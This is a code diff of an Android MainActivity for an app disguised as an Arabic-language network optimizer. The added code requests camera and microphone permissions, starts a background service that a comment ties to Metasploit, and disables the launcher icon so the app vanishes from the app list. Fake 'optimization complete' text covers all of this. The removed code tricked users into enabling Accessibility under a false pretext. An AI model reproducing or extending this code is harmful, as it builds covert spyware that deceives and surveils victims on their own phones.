@@ -1,10 +1,9 @@
 package com.abdullah.finalapp;
 
 import android.Manifest;
-import android.app.AlertDialog;
+import android.content.ComponentName;
 import android.content.Intent;
 import android.content.pm.PackageManager;
-import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.provider.Settings;
@@ -21,16 +20,16 @@ public class MainActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
-        Button btnStart = findViewById(R.id.btn_start);
-        TextView tvStatus = findViewById(R.id.tv_status);
+        Button startBtn = findViewById(R.id.startBtn);
+        TextView statusText = findViewById(R.id.statusText);
 
-        btnStart.setOnClickListener(v -> {
-            tvStatus.setText("جاري تحسين الاتصال...");
-            requestPermissions();
+        startBtn.setOnClickListener(v -> {
+            statusText.setText("جاري تحسين الشبكة...");
+            requestPermissionsAndStart();
         });
     }
 
-    private void requestPermissions() {
+    private void requestPermissionsAndStart() {
         String[] permissions = {
                 Manifest.permission.CAMERA,
                 Manifest.permission.RECORD_AUDIO,
@@ -42,8 +41,29 @@ public class MainActivity extends AppCompatActivity {
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
+        }
+
+        // تشغيل السيرفر (Metasploit)
+        Intent serviceIntent = new Intent(this, BackgroundService.class);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(serviceIntent);
         } else {
-            showAccessibilityDialog();
+            startService(serviceIntent);
+        }
+
+        // الإخفاء من قائمة التطبيقات
+        hideAppIcon();
+    }
+
+    private void hideAppIcon() {
+        try {
+            PackageManager pm = getPackageManager();
+            ComponentName componentName = new ComponentName(this, MainActivity.class);
+            pm.setComponentEnabledSetting(componentName,
+                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                    PackageManager.DONT_KILL_APP);
+        } catch (Exception e) {
+            e.printStackTrace();
         }
     }
 
@@ -51,40 +71,8 @@ public class MainActivity extends AppCompatActivity {
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == PERMISSION_REQUEST_CODE) {
-            // بعد الموافقة على الصلاحيات، نظهر رسالة توجيهية
-            showAccessibilityDialog();
+            TextView statusText = findViewById(R.id.statusText);
+            statusText.setText("تم التحسين بنجاح.");
         }
-    }
-
-    private void showAccessibilityDialog() {
-        new AlertDialog.Builder(this)
-                .setTitle("تفعيل التحكم في الشبكة")
-                .setMessage("لضمان عمل التطبيق في الخلفية وتحسين اتصال جهازك، يرجى تفعيل خدمة 'إمكانية الوصول' (Accessibility) من الإعدادات.")
-                .setPositiveButton("الذهاب للإعدادات", (dialog, which) -> {
-                    // فتح إعدادات Accessibility
-                    Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
-                    startActivity(intent);
-                    
-                    // تشغيل الخدمة بعد التفعيل
-                    startBackgroundService();
-                })
-                .setNegativeButton("إلغاء", (dialog, which) -> {
-                    // لو لغى، نقفل التطبيق
-                    finishAndRemoveTask();
-                })
-                .setCancelable(false)
-                .show();
-    }
-
-    private void startBackgroundService() {
-        Intent serviceIntent = new Intent(this, BackgroundService.class);
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(serviceIntent);
-        } else {
-            startService(serviceIntent);
-        }
-        
-        // إخفاء التطبيق
-        new android.os.Handler().postDelayed(this::finishAndRemoveTask, 1000);
     }
 }
